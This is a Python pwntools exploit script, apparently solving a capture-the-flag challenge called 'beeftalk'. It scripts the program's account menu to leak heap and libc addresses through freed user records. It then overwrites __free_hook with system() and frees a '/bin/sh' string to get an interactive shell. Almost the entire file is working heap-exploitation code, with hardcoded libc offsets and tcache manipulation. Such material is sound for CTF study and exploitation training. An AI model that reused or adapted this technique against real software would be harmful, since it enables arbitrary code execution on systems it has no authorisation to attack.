from pwn import *
import sys
import time

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
b 300
b 322
"""

if len(sys.argv) > 1:
    p = gdb.debug("./beeftalk", gdbscript=script, level="debug")
else:
    p = process("./beeftalk")


def signup(name, desc, job="dummy", money=0xDEADBEEF):
    p.sendlineafter("> ", "2")
    p.sendlineafter("> ", name)
    p.sendlineafter("> ", desc)
    p.sendlineafter("> ", job)
    p.sendlineafter("> ", str(money))
    p.sendlineafter("> ", "y")
    p.recvuntil("Done! This is your login token: ")
    token = p.recvline().strip()
    log.info(
        f"Signup name: {name}, desc: {desc}, job: {job}, money: {money}, token: {str(token)}"
    )
    return token


def login(token):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", token)
    p.recvuntil("Hello ")
    log.info(f"Login token: {token}")


def delete():
    p.sendlineafter("> ", "3")
    p.sendlineafter("> ", "y")
    log.info("Delete")


def logout():
    p.sendlineafter("> ", "4")
    log.info("Logout")


def edit(name, desc, job="dummy", money=0xDEADBEEF):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", name)
    p.sendlineafter("> ", desc)
    p.sendlineafter("> ", job)
    p.sendlineafter("> ", str(money))
    log.info(f"Update name: {name}, desc: {desc}, job: {job}, money: {money}")


# leak heap
token = signup("A" * 0x80, "desc")
login(token)
delete()

token = signup("", "desc")
login(token)
heap = (u64(p.recv(6).ljust(8, b"\x00")) >> 12) << 12
log.info(f"Heap: {hex(heap)}")
delete()

# leak libc
tokens = []
for i in range(8):
    token = signup("A" * 0x80, "desc")
    tokens.append(token)
log.info("Signup 8")

for i in range(8):
    login(tokens[i])
    delete()
log.info("delete 8")

tokens[0] = signup("A" * 0x80, "desc")
login(tokens[3])
libc = u64(p.recv(6).ljust(8, b"\x00")) - 0x1ECC10
_system = libc + 0x522C0
_free_hook = libc + 0x1EEE48
log.info(f"Libc: {hex(libc)}")
logout()

# users[0].desc == users[2]
login(tokens[0])
edit("A" * 0x80, p64(_free_hook - 8) + p64(_free_hook))
logout()

login(tokens[2])
edit(b"/bin/sh\x00", p64(_system))
delete()

p.interactive()

# *name   | *desc
# *job    | *pipe_name
# *fifo0  | *fifo1
# namelen | token
# assets
